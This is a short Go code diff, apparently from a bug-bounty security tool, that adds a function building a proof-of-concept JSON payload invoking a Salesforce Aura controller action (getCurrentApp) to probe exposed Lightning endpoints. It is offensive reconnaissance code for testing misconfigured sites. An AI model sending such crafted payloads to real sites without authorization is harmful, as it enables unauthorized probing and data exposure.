@@ -133,3 +133,17 @@ func PayloadGeneratorAuraContext(fwuid string, app string, markup string) []byte
 }
 
 
+func PayloadGeneratorDump() []byte {
+
+	payload1 := `[{"id":"bugcrowd","descriptor":"serviceComponent://ui.global.components.one.one.controller.OneController/ACTION$getCurrentApp","callingDescriptor":"UNKNOWN","params":{}}]`
+	finalpayload := []byte(payload1)
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+	genPOC, err := json.Marshal(p)
+	if err != nil {
+		panic(err)
+	}
+	return genPOC
+
+}
